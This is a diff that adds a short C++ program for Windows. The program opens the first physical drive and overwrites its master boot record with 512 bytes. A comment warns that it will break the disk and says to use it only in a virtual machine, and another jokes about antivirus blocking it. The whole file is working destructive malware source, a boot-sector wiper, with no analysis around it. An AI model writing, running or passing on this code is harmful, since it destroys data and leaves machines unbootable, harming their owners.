@@ -1,0 +1,33 @@
+#include <Windows.h>
+#include <iostream>
+using namespace std;
+//WARNING : this will break your main hdd/ssd, use it only in virtual machine for testing..
+#define BYTES_TO_WRITE 512 // write 512 bytes to mbr 
+
+
+int main(int argc, char** argv) {
+	
+
+
+	//handle to file which is the mbr
+
+
+	HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+	if (hDrive == INVALID_HANDLE_VALUE) cout << "failed to retierive mbr\r\n";
+
+	
+	DWORD Written;
+	char *wBytes[BYTES_TO_WRITE]; // 512 bytes to write on mbr
+	if (WriteFile(hDrive, &wBytes, BYTES_TO_WRITE, &Written, 0) == true){
+
+		cout << "bytes written succesfully to mbr" << endl;
+		Sleep(2000);
+
+	}else
+	cout << "failed to write!" << endl;//antivirus block maybe hehe
+
+	system("pause");
+	
+	return 0;
+}
